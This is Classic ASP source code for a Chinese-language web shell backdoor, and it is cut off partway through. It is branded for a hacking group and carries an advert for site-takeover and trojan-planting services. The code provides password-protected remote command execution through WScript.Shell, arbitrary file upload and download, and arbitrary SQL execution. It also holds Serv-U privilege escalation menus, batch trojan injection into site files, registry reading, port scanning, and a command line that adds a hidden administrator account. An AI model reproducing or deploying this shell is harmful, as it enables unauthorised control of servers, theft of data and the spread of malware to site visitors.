<%
Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next
AD="承接流量、挂马、拿站，免杀等服务，QQ：594582718"
Copyright="<font size=5 color=red><b>已授权给华夏鸡享用</b></font>"
mName="<font size=5 color=red><b>华夏鸡专用女人2008 公开版</b></font>"
UserPass="jitou4"
SiteURL=""
sub ShowErr()
If Err Then
RRS"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
Err.Clear:Response.Flush
End If
end sub
Sub RRS(str)
response.write(str)
End Sub
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
serveru=request.servervariables("http_host")&url
serverp=userpass
FolderPath=Request("FolderPath")
FName=Request("FName")
BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&ServerIP&"</title>"
rRs"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
Rrs"<title>"&mNaMe1&" - "&sERVeRIP&" </title>"
rrS"<style type=""text/css"">"
rRS"body,td{font-size: 12px;background-color:green;color:#eee;}"
rRs"input,select,textarea{font-size: 12px;background-color:#ddd;border:1px solid #fff}"
RrS".C{background-color:#000000;border:0px}"
Rrs".cmd{background-color:#000;color:#FFF}"
rRs"body{margin: 0px;margin-left:4px;}"
rrs"a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}"
RRS".am{color:while;font-size:11px;}"
rRs"</style>"
RRS"<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;"
RRS"function yesok(){if (confirm(""确认要执行此操作吗？""))return true;else return false;}"
RRS"function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""→"&AD&"  --""+display;}runClock();"
RRS"function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}"
RRS"function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""请输入移动到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""请输入要新建的文件夹全名称"",FName);top.hideform.FName.value = DName;}else if(FAction==""CreateMdb""){DName = prompt(""请输入要新建的Mdb文件全名称,注意不能同名！"",FName);top.hideform.FName.value = DName;}else if(FAction==""CompactMdb""){DName = prompt(""请输入要压缩的Mdb文件全名称,注意文件是否存在！"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}"
RRS"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""请先连接数据库"");FullDbStr(0);return false;}return true;}"
RRS"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>请确认己连接数据库再输入SQL操作命令语句。</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}"
RRS"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""请检查数据库连接串是否正确!"");return false;}if(str.length<10){alert(""请检查SQL语句是否正确!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"
RRS"</script>"
RrS"<body" 
If Action="" then RRS " scroll=no"
rrs ">"
Dim ObT(13,2)
ObT(0,0) = "Scripting.FileSystemObject"
ObT(0,2) = "文件操作组件"
ObT(1,0) = "wscript.shell"
ObT(1,2) = "命令行执行组件"
ObT(2,0) = "ADOX.Catalog"
ObT(2,2) = "ACCESS建库组件"
ObT(3,0) = "JRO.JetEngine"
ObT(3,2) = "ACCESS压缩组件"
ObT(4,0) = "Scripting.Dictionary" 
ObT(4,2) = "数据流上传辅助组件"
ObT(5,0) = "Adodb.connection"
ObT(5,2) = "数据库连接组件"
ObT(6,0) = "Adodb.Stream"
ObT(6,2) = "数据流上传组件"
ObT(7,0) = "SoftArtisans.FileUp"
ObT(7,2) = "SA-FileUp 文件上传组件"
ObT(8,0) = "LyfUpload.UploadFile"
ObT(8,2) = "刘云峰文件上传组件"
ObT(9,0) = "Persits.Upload.1"
ObT(9,2) = "ASPUpload 文件上传组件"
ObT(10,0) = "JMail.SmtpMail"
ObT(10,2) = "JMail 邮件收发组件"
ObT(11,0) = "CDONTS.NewMail"
ObT(11,2) = "虚拟SMTP发信组件"
ObT(12,0) = "SmtpMail.SmtpMail.1"
ObT(12,2) = "SmtpMail发信组件"
ObT(13,0) = "Microsoft.XMLHTTP"
ObT(13,2) = "数据传输组件"
For i=0 To 13
Set T=Server.CreateObject(ObT(i,0))
If -2147221005 <> Err Then
IsObj=" √"
Else
IsObj=" ×"
Err.Clear
End If
Set T=Nothing
ObT(i,1)=IsObj
Next
If FolderPath<>"" then
Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
FolderPath=RootPath
Session("FolderPath")=FolderPath
End if
Function MainForm()
RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<table width='100%' height='100%'  border=0 cellpadding='0' cellspacing='0'>"
RRS"<tr><td height='30' colspan='2'>"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='60' align='center'>地址栏：</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='转到'> <input name='gb' type='button' value='返回' onclick='history.back();'> <input type='submit' value='刷新' onclick='FileFrame.location.reload()'>" 
RRS"</td></tr></form></table></td></tr><tr><td width='170'>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
RRS"<td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
RRS"</td></tr></table>"
End Function
Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td height='5'></td></tr>"
RRS"<tr><td><center><a href='"&SiteURL&"' target='_blank'><font color=red>"&mName&"</font></center></a><hr hight=1 width='100%'>"
RRS"</td></tr>"
If ObT(0,1)=" ×" Then
RRS"<tr><td height='24'>无权限</td></tr>"
Else
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height=22 onmouseover=""menu1.style.display=''""><b> +>常规目录浏览</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'><b>站点根目录</b></a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'><b>本程序目录</b></a><br>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height=22 onmouseover=""menu3.style.display=''""><b> +>提权目录总结</b><div id=menu3 style=""width:100%;display='none'"" onmouseout=""menu3.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Progra~1"")'>->C:\\Progra~1</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Docume~1"")'>->C:\\Docume~1</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere"")'>->Pcanywhere</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\Serv-U"")'>->Serv-U(1)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\RhinoSoft.com"")'>->Serv-U(2)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\WINDOWS\\Temp"")'>->Temp(XP)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\Temp"")'>->Temp(2000)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\WINNT\\system32\\config"")'>->Config(2000)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\windows\\system32\\config"")'>->Config(XP)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序"")'>->开始→程序</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents"")'>->Erveryone(1)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data"")'>->data</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\RECYCLER"")'>->RECYCLER</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\winnt\\system32\\inetsrv\\data"")'>->Erveryone(2)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\windows\\system32\\inetsrv\\data"")'>->Erveryone(3)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Documents and Settings\\Administrator\\桌面"")'>->桌面图标</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\PHP"")'>->PHP目录</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\prel"")'>->Perl目录</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\mysql"")'>->Mysql目录</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server"")'>->Mssql目录</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>->RealSever</a><br>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
End If
RRS"<tr><td height='24' onmouseover=""menu6.style.display=''""><b>+>常规操作工具</b><div id=menu6 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu6.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\1")&""",""NewFolder"")'>->新建目录</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=EditFile' target='FileFrame'>->新建文本</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=UpFile' target='FileFrame'>->上传文件</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Cmd1Shell' target='F0:52 2007-10-6ileFrame'><b>->执行CMD命令</b></a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=guan' target='FileFrame'>->管理组帐号</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=getTerminalInfo' target='FileFrame'>-><b>服务器探测</b></a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Course' target='FileFrame'>->系统服务-用户账号</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=ServerInfo' target='FileFrame'>->服务器信息-组件支持</a><br>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='24' onmouseover=""menu2.style.display=''""><b>+>数据库操作工具</b><div id=menu2 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu2.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=DbManager' target='FileFrame'>->连接数据库</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>->建立MDB文件</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=backup' target='FileFrame'>->数据库字段复制</a><br>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='24' onmouseover=""menu7.style.display=''""><b>+>提升权限工具</b><div id=menu7 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu7.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=leaves' target='FileFrame'><b>->Servu提权</b>(leaves)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Servu' target='FileFrame'><b>->Servu提权</b>(golds7n)</a><br>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='24' onmouseover=""menu4.style.display=''""><b>+>批量操作工具</b><div id=menu4 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu4.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Cplgm&M=1' target='FileFrame'>->批量<b>挂马</b>(超强版)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Cplgm&M=2' target='FileFrame'>->批量<b>清马</b>(超强版)</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Cplgm&M=3' target='FileFrame'>->批量<b>替换</b>(超强版)</a><br>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='24' onmouseover=""menu5.style.display=''""><b>+>其他辅助工具</b><div id=menu5 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu5.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=backuu' target='FileFrame'>->网站打包工具</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=ReadREG' target='FileFrame'>->读取注册表数据</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=webproxy' target='FileFrame'>->WEB服务器代理</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=xcmd5' target='FileFrame'>->MD5密码查询</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=otools' target='FileFrame'>->在线工具集</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=dow' target='FileFrame'>->DownFile</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=d' target='FileFrame'>->执行asp代码</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=ScanPort' target='FileFrame'>->端口扫描器</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=kmuma' target='FileFrame'>->ScanWebshell</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=uu' target='FileFrame'>->Update this shell</a><br>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Logout' target='_top'>->退出登录</a>"
RRS"</td></tr><tr><td height='20'></td></tr>"
RRS"<tr><td height='20'></td></tr>"
RRS"<tr><td align=center style='color:red'><hr>"&Copyright&"</td></tr></table>"
RRS"</table>"
End Function
Function Course()
SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>系统用户与服务</td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr>"
SI=SI&"<td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"
SI=SI&obj.Name
SI=SI&"</td><td bgcolor=""#FFFFFF"">&nbsp;" 
SI=SI&"系统用户(组)"
SI=SI&"</td></tr>"
SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">&nbsp;</td></tr>" 
end if
if OBJ.StartType=2 then lx="自动"
if OBJ.StartType=3 then lx="手动"
if OBJ.StartType=4 then lx="禁用"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#FF0000>&nbsp;"&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#3399FF>&nbsp;"&obj.path&"</font></td></tr>"
end if
next
RRS SI&SI0&SI1&SI2&"</table>"
End Function
Function ServerInfo()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>服务器组件信息</td></tr>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器名</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr>"
SI=SI&"<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"
SI=SI&"<input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='查询'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器时间</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器CPU数量</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器操作系统</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB服务器版本</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
For i=0 To 13
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
RRS SI
End Function
Function DownFile(Path)
Response.Clear
Set OSM = CreateObject(ObT(6,0))
OSM.Open
OSM.Type = 1
OSM.LoadFromFile Path
sz=InstrRev(path,"\")+1
Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
Response.AddHeader "Content-Length", OSM.Size
Response.Charset = "UTF-8"
Response.ContentType = "application/octet-stream"
Response.BinaryWrite OSM.Read
Response.Flush
OSM.Close
Set OSM = Nothing
End Function
Function HTMLEncode(S)
if not isnull(S) then
S = replace(S, ">", "&gt;")
S = replace(S, "<", "&lt;")
S = replace(S, CHR(39), "&#39;")
S = replace(S, CHR(34), "&quot;")
S = replace(S, CHR(20), "&nbsp;")
HTMLEncode = S
end if
End Function
Function UpFile()
If Request("Action2")="Post" Then
Set U=new UPC : Set F=U.UA("LocalFile")
UName=U.form("ToPath")
If UName="" Or F.FileSize=0 then
SI="<br>请输入上传的完全路径后选择一个文件上传!"
Else
F.SaveAs UName
If Err.number=0 Then
SI="<center><br><br><br>文件"&UName&"上传成功！</center>"
End if
End If
Set F=nothing:Set U=nothing
SI=SI&BackUrl
RRS SI
ShowErr()
Response.End
End If
SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
SI=SI&"<tr><td>"
SI=SI&"上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\cmd.exe")&"' size='40'>"
SI=SI&" <input name='LocalFile' type='file'  size='25'>"
SI=SI&" <input type='submit' name='Submit' value='上传'>"
SI=SI&"</td></tr></form></table>"
RRS SI
End Function
Function Cmd1Shell()
checked=" checked"
If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
ShellPath=Session("ShellPath")
if ShellPath="" Then ShellPath = "cmd.exe"
if Request("wscript")<>"yes" then checked=""
If Request("cmd")<>"" Then DefCmd = Request("cmd")
SI="<form method='post'>"
SI=SI&"cmd路径：<input name='SP' value='"&ShellPath&"' Style='width:70%'>&nbsp;&nbsp;"
SI=SI&"<input class=c type='checkbox' name='wscript' value='yes'"&checked&">WScript.Shell"
SI=SI&"<input name='cmd' Style='width:92%' value='"&DefCmd&"'> <input type='submit' value='执行'><textarea Style='width:100%;height:440;' class='cmd'>"
If Request.Form("cmd")<>"" Then
if Request.Form("wscript")="yes" then
Set CM=CreateObject(ObT(1,0))
Set DD=CM.exec(ShellPath&" /c "&DefCmd)
aaa=DD.stdout.readall
SI=SI&aaa
else
On Error Resume Next
Set ws=Server.CreateObject("WScript.Shell")
Set ws=Server.CreateObject("WScript.Shell")
Set fso=Server.CreateObject("Scripting.FileSystemObject")
szTempFile = server.mappath("cmd.txt")
Call ws.Run (ShellPath&" /c " & DefCmd & " > " & szTempFile, 0, True)
Set fs = CreateObject("Scripting.FileSystemObject")
Set oFilelcx = fs.OpenTextFile (szTempFile, 1, False, 0)
aaa=Server.HTMLEncode(oFilelcx.ReadAll)
oFilelcx.Close
Call fso.DeleteFile(szTempFile, True)
SI=SI&aaa
end if
End If
SI=SI&chr(13)&"</textarea></form>"
RRS SI
response.write("<font size=6 color=red>net start  ----查看服务<p></p>")
response.write("<font size=6 color=red>query user  ----查看终端登录用户<p></p>")
response.write("<font size=6 color=red>netstat -anb  ----查看程序开放的端口<p></p>")
response.write("<font size=6 color=red>regedit -e d:\1.reg 注册表键值  ----导出注册表键值<p></p>")
response.write("<font size=6 color=red>regedit -s d:\1.reg 注册表键值  ----导入注册表键值<p></p>")
response.write("<font size=6 color=red>net user leaves cnsst /add & net localgroup administrators leaves /add  ----建立管理员leaves<p></p>")
End Function
Function CreateMdb(Path) 
SI="<br><br>"
Set C = CreateObject(ObT(2,0)) 
C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
Set C = Nothing
If Err.number=0 Then
SI = SI & Path & "建立成功!"
End If
SI=SI&BackUrl 
RRS SI
End function
if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass then
session("web2a2dmin")=UserPass
response.redirect url
else
rrs"别猜了，错的!"
end if
else
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='"&SiteURL&"' target='_blank'>"&mname&"</a><hr><form action='"&url&"' method='post'>密码：<input name='pass' type='password' size='22'> <input type='submit' value='登录'><hr>"&Copyright&"<br>"&sers&"</div></center>"
if instr(SI,SIC)<>0 then rrs sI
end if
response.end
end if
Function DbManager()
SqlStr=Trim(Request.Form("SqlStr"))
DbStr=Request.Form("DbStr")
SI=SI&"<table width='650'border='0' cellspacing='0' cellpadding='0'>"
SI=SI&"<form name='DbForm' method='post' action=''>"
SI=SI&"<tr><td width='100' height='27'> &nbsp;数据库连接串:</td>"
SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option>"
SI=SI&"<option value=1>MsSql连接</option><option value=2>MySql连接</option><option value=3>DSN连接</option>"
SI=SI&"<option value=-1>--SQL语法--</option><option value=4>显示数据</option><option value=5>添加数据</option>"
SI=SI&"<option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option>"
SI=SI&"<option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option>"
SI=SI&"<option value=12>完全显示</option></select></td></tr>"
SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
SI=SI&"<tr><td height='30'>&nbsp;SQL操作命令:</td>"
SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
SI=SI&"<td align='center'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()'></td>"
SI=SI&"</tr></form></table><span id='abc'></span>"
RRS SI:SI=""
If Len(DbStr)>40 Then
Set Conn=CreateObject(ObT(5,0))
Conn.Open DbStr
Set Rs=Conn.OpenSchema(20) 
SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>表<br>名</td>"
Rs.MoveFirst 
Do While Not Rs.Eof
If Rs("TABLE_TYPE")="TABLE" then
TName=Rs("TABLE_NAME")
SI=SI&"<td align=center><a href=""javascript:if(confirm('确定删除么？'))FullSqlStr('DROP TABLE ["&TName&"]',1)"">[ del ]</a><br>"
SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
End If 
Rs.MoveNext 
Loop 
Set Rs=Nothing
SI=SI&"</tr></table>"
RRS SI:SI=""
If Len(SqlStr)>10 Then
If LCase(Left(SqlStr,6))="select" then
SI=SI&"执行语句："&SqlStr
Set Rs=CreateObject("Adodb.Recordset")
Rs.open SqlStr,Conn,1,1
FN=Rs.Fields.Count
RC=Rs.RecordCount
Rs.PageSize=20
Count=Rs.PageSize
PN=Rs.PageCount
Page=request("Page")
If Page<>"" Then Page=Clng(Page)
If Page="" Or Page=0 Then Page=1
If Page>PN Then Page=PN
If Page>1 Then Rs.absolutepage=Page
SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"
For n=0 to FN-1
Set Fld=Rs.Fields.Item(n)
SI=SI&"<td align='center'>"&Fld.Name&"</td>"
Set Fld=nothing
Next
SI=SI&"</tr>"
Do While Not(Rs.Eof or Rs.Bof) And Count>0
Count=Count-1
Bgcolor="#EFEFEF"
SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
For i=0 To FN-1
If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
If RC=1 Then
ColInfo=HTMLEncode(Rs(i))
Else
ColInfo=HTMLEncode(Left(Rs(i),50))
End If
SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
Next
SI=SI&"</tr>"
Rs.MoveNext
Loop
RRS SI:SI=""
SqlStr=HtmlEnCode(SqlStr)
SI=SI&"<tr><td colspan="&FN+1&" align=center>记录数："&RC&"&nbsp;页码："&Page&"/"&PN
If PN>1 Then
SI=SI&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>首页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>上一页</a>&nbsp;"
If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
For i=Sp To Sp+8
If i>PN Then Exit For
If i=Page Then
SI=SI&i&"&nbsp;"
Else
SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
End If
Next
SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>下一页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>尾页</a>"
End If
SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
Rs.Close:Set Rs=Nothing
RRS SI:SI=""
Else   
Conn.Execute(SqlStr)
SI=SI&"SQL语句："&SqlStr
End If
